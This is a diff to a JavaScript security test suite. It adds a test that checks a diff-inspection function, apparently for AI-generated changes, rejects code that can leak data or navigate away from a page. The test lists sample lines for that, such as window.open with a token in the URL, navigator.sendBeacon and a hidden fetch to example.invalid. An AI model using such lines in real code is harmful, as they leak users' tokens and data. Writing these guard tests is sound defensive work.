@@ -43,6 +43,20 @@ test('security rejects browser exfiltration primitives and modern credentials', 
   }
 });
 
+test('security rejects browser side-channel exfiltration and navigation additions', () => {
+  for (const addition of [
+    '+window.open("https://example.invalid/?data=" + token);',
+    '+navigator["sendBeacon"]("https://example.invalid", body);',
+    '+const pixel = new Image();',
+    '+location.assign("https://example.invalid");',
+    '+window.location.href = "https://example.invalid";',
+    '+document.createElement("iframe");',
+    '+globalThis["fetch"]("https://example.invalid");'
+  ]) {
+    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
+  }
+});
+
 test('security refuses removal of existing feedback authentication and ownership guards', () => {
   const protectedSource = [
     'const auth = await supabase.auth.getUser();',
